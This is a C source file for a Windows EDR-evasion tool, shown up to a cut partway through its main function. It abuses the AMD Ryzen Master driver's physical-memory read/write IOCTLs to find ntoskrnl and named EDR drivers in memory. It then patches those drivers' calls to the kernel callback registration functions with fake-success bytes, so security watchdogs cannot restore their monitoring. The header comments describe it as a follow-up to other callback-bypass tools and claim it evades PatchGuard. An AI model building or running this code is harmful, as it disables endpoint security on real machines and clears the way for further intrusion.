/*
 * watchdog_kill.c â€” Prevent EDR drivers from re-registering kernel callbacks
 *
 * Problem: after zeroing callbacks with notify_callbacks_bypass, flt_bypass_global,
 * ob_callbacks_bypass, and cm_callbacks_bypass, an EDR's watchdog thread may
 * detect the missing callbacks and call the registration functions again.
 *
 * Solution: scan the EDR driver's code for CALL instructions that target
 * kernel callback registration functions, then patch those calls to:
 *
 *   48 31 C0   xor rax, rax      (return value = 0 = STATUS_SUCCESS)
 *   90 90 90   3Ã— NOP            (pad to 6 bytes)
 *
 * The watchdog believes re-registration succeeded (STATUS_SUCCESS = 0) while
 * actually nothing was registered.
 *
 * â”€â”€ Scan technique â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Windows drivers import ntoskrnl functions via the Import Address Table (IAT).
 * After the driver loads, the IAT entry for each imported function contains the
 * function's actual virtual address. Calls to imported functions use:
 *
 *   FF 15 [disp32]   CALL QWORD PTR [RIP + disp32]
 *
 * where [RIP + disp32] is the IAT entry address.
 *
 * For each FF 15 in the driver code:
 *   iat_entry_va  = (instr_va + 6) + sign_extend(disp32)
 *   iat_entry_pa  = drv_pa + (iat_entry_va - drv_va)
 *   resolved_va   = phys_read_qword(iat_entry_pa)
 *
 * If resolved_va matches any registration function â†’ patch the 6-byte call.
 *
 * Target registration functions (all from ntoskrnl.exe):
 *   PsSetCreateProcessNotifyRoutine
 *   PsSetCreateProcessNotifyRoutineEx
 *   PsSetCreateProcessNotifyRoutineEx2   (Win10 RS4+)
 *   PsSetLoadImageNotifyRoutine
 *   PsSetLoadImageNotifyRoutineEx        (Win10 RS4+)
 *   PsSetCreateThreadNotifyRoutine
 *   ObRegisterCallbacks
 *   CmRegisterCallbackEx
 *   CmRegisterCallback
 *
 * â”€â”€ Restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Original 6 bytes saved before patching.  Restored on Enter / Ctrl+C.
 *
 * â”€â”€ PatchGuard note â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * We modify non-system driver code (EDR driver .text), NOT ntoskrnl.
 * PatchGuard only protects ntoskrnl / hal / win32k code integrity.
 * Patching a third-party driver's .text is not detected by PatchGuard.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o watchdog_kill.exe \
 *       watchdog_kill.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in_buf,12,out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

/* â”€â”€ Kernel module map â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS];
static int  g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

/* â”€â”€ PE export RVA lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* â”€â”€ Find ntoskrnl PA via 2MB NtBuildNumber scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define CHUNK_SIZE 0x10000
static uint8_t g_chunk[CHUNK_SIZE];

static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if(!rva) return 0;
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; phys_read(pa+rva,&val,4);
            if(val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* â”€â”€ Find driver PA via MZ+TimeDateStamp scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int find_driver_path(const char *drv_name, char *path_out, int max)
{
    char windir[512], sysdir[512];
    GetWindowsDirectoryA(windir, sizeof windir);
    GetSystemDirectoryA(sysdir, sizeof sysdir);
    snprintf(path_out,max,"%s\\drivers\\%s",sysdir,drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(path_out,max,"%s\\%s",sysdir,drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(path_out,max,"%s\\SysWOW64\\drivers\\%s",windir,drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;
    return 0;
}

static uint64_t find_driver_pa(const char *drv_name)
{
    char path[1024];
    if(!find_driver_path(drv_name,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[0x200]={0}; DWORD rd=0;
    ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);
    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
    uint32_t pe_off=*(uint32_t*)(hdr+0x3C);
    if(pe_off+12>rd||*(uint32_t*)(hdr+pe_off)!=0x00004550) return 0;
    uint16_t machine=*(uint16_t*)(hdr+pe_off+4);
    uint32_t ts=*(uint32_t*)(hdr+pe_off+8);
    printf("      Disk: machine=0x%04X  ts=0x%08X\n",machine,ts);

    uint64_t last_prog=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<rend;cpa+=CHUNK_SIZE){
            if(cpa-last_prog>=0x80000000ULL){
                printf("      [%5llu MB]\r",(unsigned long long)(cpa>>20));
                fflush(stdout); last_prog=cpa;
            }
            uint64_t csz=rend-cpa; if(csz>CHUNK_SIZE) csz=CHUNK_SIZE;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C);
                if(peo+12>csz-off||*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
                if(*(uint16_t*)(g_chunk+off+peo+4)!=machine) continue;
                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
                printf("      Found at PA=0x%016llX\n",(unsigned long long)(cpa+off));
                return cpa+off;
            }
        }
    }
    printf("      Not found (PE header may be zeroed â€” skipping)\n");
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Registration function targets
 *
 * After loading ntoskrnl PA, we resolve each function's VA.
 * We then scan each EDR driver for FF 15 calls resolving to these VAs.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static const char *REG_FUNC_NAMES[] = {
    "PsSetCreateProcessNotifyRoutine",
    "PsSetCreateProcessNotifyRoutineEx",
    "PsSetCreateProcessNotifyRoutineEx2",   /* Win10 RS4+ */
    "PsSetLoadImageNotifyRoutine",
    "PsSetLoadImageNotifyRoutineEx",         /* Win10 RS4+ */
    "PsSetCreateThreadNotifyRoutine",
    "ObRegisterCallbacks",
    "CmRegisterCallbackEx",
    "CmRegisterCallback",
    NULL
};

#define MAX_REG_FUNCS 16
static uint64_t g_reg_vas[MAX_REG_FUNCS];  /* VA of each registration function */
static int      g_n_reg = 0;

/*
 * Patch bytes for a 6-byte FF15 call site:
 *   48 31 C0  xor rax, rax   â€” return STATUS_SUCCESS (0) to caller
 *   90 90 90  3Ã— NOP         â€” fill remaining 3 bytes
 */
static const uint8_t FAKE_RETURN[6] = {0x48, 0x31, 0xC0, 0x90, 0x90, 0x90};
static const int     CALL_LEN       = 6;

typedef struct {
    uint64_t call_pa;           /* PA of the FF 15 instruction */
    uint64_t call_va;           /* VA of the FF 15 instruction */
    uint64_t drv_va;            /* driver image base VA (for RVA display) */
    uint64_t iat_entry_va;      /* IAT entry VA used by this call */
    uint64_t resolved_va;       /* actual target function VA */
    const char *func_name;      /* name of the target registration function */
    uint8_t  orig[6];           /* original 6 bytes */
    int      patched;
} CallSite;

#define MAX_CALL_SITES 512
static CallSite g_sites[MAX_CALL_SITES];
static int      g_n_sites = 0;

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Scan one driver for FF 15 calls to registration functions
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static int scan_driver(const char *drv_name, uint64_t drv_pa, uint64_t drv_va,
                       uint64_t drv_size)
{
    int found = 0;
    uint64_t last_prog = 0;
    uint64_t scan_end = drv_pa + drv_size;

    for (uint64_t cpa = drv_pa; cpa < scan_end; cpa += CHUNK_SIZE) {
        if (cpa - last_prog >= 0x10000ULL) {
            last_prog = cpa;
        }
        uint64_t csz = scan_end - cpa;
        if (csz > CHUNK_SIZE) csz = CHUNK_SIZE;
        if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;

        for (uint64_t off = 0; off + 6 <= csz; off++) {
            /* FF 15 = indirect CALL through RIP-relative pointer */
            if (g_chunk[off] != 0xFF || g_chunk[off+1] != 0x15) continue;

            /* RIP after instruction = instruction_va + 6 */
            uint64_t instr_va = drv_va + (cpa - drv_pa) + off;
            uint64_t next_rip = instr_va + 6;
            int32_t  disp32   = *(int32_t*)(g_chunk + off + 2);
            uint64_t iat_va   = (uint64_t)((int64_t)next_rip + disp32);

            /* IAT entry must be within driver VA range */
            if (iat_va < drv_va || iat_va >= drv_va + drv_size) continue;

            /* Read IAT entry from physical memory */
            uint64_t iat_pa = drv_pa + (iat_va - drv_va);
            if (!pa_in_range(iat_pa, 8)) continue;
            uint64_t resolved = 0;
            if (!phys_read(iat_pa, &resolved, 8)) continue;
            if (!resolved) continue;

            /* Check if resolved VA matches any registration function */
            int match = -1;
            for (int j = 0; j < g_n_reg; j++)
                if (g_reg_vas[j] && resolved == g_reg_vas[j]) { match = j; break; }
            if (match < 0) continue;

            /* Dedup */
            uint64_t call_pa = cpa + off;
            int dup = 0;
            for (int j = 0; j < g_n_sites; j++)
                if (g_sites[j].call_pa == call_pa) { dup=1; break; }
            if (dup || g_n_sites >= MAX_CALL_SITES) continue;

            /* Read original bytes */
            CallSite *s = &g_sites[g_n_sites++];
            s->call_pa     = call_pa;
            s->call_va     = instr_va;
            s->drv_va      = drv_va;
            s->iat_entry_va = iat_va;
            s->resolved_va  = resolved;
            s->func_name    = REG_FUNC_NAMES[match];
            s->patched      = 0;
            memset(s->orig, 0, 6);
            phys_read(call_pa, s->orig, 6);

            printf("      [%3d] +0x%06llX  CALL â†’ %s\n",
                   g_n_sites,
                   (unsigned long long)(instr_va - drv_va),
                   s->func_name);
            found++;
        }
    }
    return found;
}

/* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

static volatile int g_any_patched = 0;

static void restore_all(void)
{
    if (!g_any_patched) return;
    printf("[R] Restoring %d call sites...\n", g_n_sites);
    for (int i = 0; i < g_n_sites; i++) {
        CallSite *s = &g_sites[i];
        if (!s->patched) continue;
        uint8_t cur[6] = {0};
        if (phys_read(s->call_pa, cur, 6) &&
            memcmp(cur, FAKE_RETURN, 6) == 0)
            phys_write(s->call_pa, s->orig, 6);
        s->patched = 0;
    }
    cache_evict_multiccd();
    g_any_patched = 0;
    printf("[R] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_any_patched){
            printf("\n[!] %s â€” emergency restore...\n",ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout); restore_all(); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== Watchdog Kill â€” Prevent EDR Callback Re-registration ===\n\n");
    printf("  Method: NOP out CALL instructions in EDR driver code that target\n");
    printf("          kernel callback registration functions (FF 15 IAT pattern).\n");
    printf("  Patch:  FF 15 xx xx xx xx  â†’  48 31 C0 90 90 90\n");
    printf("          (xor rax,rax = STATUS_SUCCESS, then 3 NOPs)\n\n");
    printf("  PatchGuard: safe â€” modifies third-party driver code, NOT ntoskrnl.\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    load_module_map();
    printf("[2] Kernel modules: %d\n\n",g_nmods);

    /* ntoskrnl VA + path */
    MOD_LIST *ml=get_module_list();
    if(!ml){printf("[-] Module list\n");CloseHandle(g_dev);return 1;}
    uint64_t nt_va=(uint64_t)ml->Modules[0].ImageBase;
    char nt_path[512]={0};
    {
        const char *fn=ml->Modules[0].FullPathName+ml->Modules[0].OffsetToFileName;
        char sd[MAX_PATH]; GetSystemDirectoryA(sd,sizeof sd);
        snprintf(nt_path,sizeof nt_path,"%s\\%s",sd,fn);
        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sd);
    }
    free(ml);

    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open ntoskrnl\n");CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(pe_sz);
    DWORD rd=0; ReadFile(hf,pe_buf,pe_sz,&rd,NULL); CloseHandle(hf);

    printf("[3] Finding ntoskrnl PA...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe_buf);CloseHandle(g_dev);return 1;}
    printf("    PA=0x%016llX\n\n",(unsigned long long)nt_pa);

    /* Resolve registration function VAs */
    printf("[4] Resolving registration function VAs:\n");
    g_n_reg = 0;
    for (int i = 0; REG_FUNC_NAMES[i] && g_n_reg < MAX_REG_FUNCS; i++) {
        uint32_t rva = pe_export_rva(pe_buf, pe_sz, REG_FUNC_NAMES[i]);
        if (rva) {
            g_reg_vas[g_n_reg] = nt_va + rva;
            printf("    %-45s  VA=0x%016llX\n",
                   REG_FUNC_NAMES[i], (unsigned long long)g_reg_vas[g_n_reg]);
        } else {
            g_reg_vas[g_n_reg] = 0;
            printf("    %-45s  (not exported on this build)\n", REG_FUNC_NAMES[i]);
        }
        g_n_reg++;
    }
    free(pe_buf);
    printf("\n");

    /* Select target EDR drivers */
    printf("[5] Target EDR drivers to scan.\n");
    printf("    Enter driver names (one per line, blank to finish):\n");
    printf("    Examples: SentinelMonitor.sys, CrowdStrike.sys, MpKsl*.sys\n");
    printf("    Or type 'auto' to scan all [EDR?] drivers from the module list.\n\n");

    char drv_names[32][128];
    int n_drv = 0;

    printf("  > "); fflush(stdout);
    char first[256]={0}; fgets(first,sizeof first,stdin);
    first[strcspn(first,"\r\n")]='\0';

    if (_stricmp(first,"auto")==0) {
        /* Auto-select: all non-system, non-network, non-VM drivers */
        static const char *sys_skip[] = {
            "ntoskrnl","hal","win32k","FLTMGR","Ntfs","classpnp","storport",
            "disk","volmgr","cng","ksecdd","CLFS","tcpip","ndis","netio",
            "afd","HTTP","tdx",NULL
        };
        for (int m = 1; m < g_nmods && n_drv < 32; m++) {
            int skip = 0;
            for (int j = 0; sys_skip[j]; j++)
                if (_strnicmp(g_mods[m].name, sys_skip[j], strlen(sys_skip[j]))==0)
                    { skip=1; break; }
            if (!skip) {
                strncpy(drv_names[n_drv], g_mods[m].name, 127);
                drv_names[n_drv][127]='\0'; n_drv++;
            }
        }
        printf("    Auto-selected %d drivers.\n\n", n_drv);
    } else {
        /* Manual entry */
        if (first[0]) {
            snprintf(drv_names[n_drv++], 128, "%s", first);
        }
        while (n_drv < 32) {
            printf("  > "); fflush(stdout);
            char line[256]={0}; fgets(line,sizeof line,stdin);
            line[strcspn(line,"\r\n")]='\0';
            if (!line[0]) break;
            snprintf(drv_names[n_drv++], 128, "%s", line);
        }
    }

    if (!n_drv) { printf("  No drivers specified â€” exiting.\n"); goto done; }

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* Scan each driver */
    printf("[6] Scanning driver code for registration CALLs...\n\n");
    int total_found = 0;

    for (int di = 0; di < n_drv; di++) {
        const char *name = drv_names[di];

        /* Find this driver in module list */
        uint64_t drv_va = 0; uint64_t drv_size = 0;
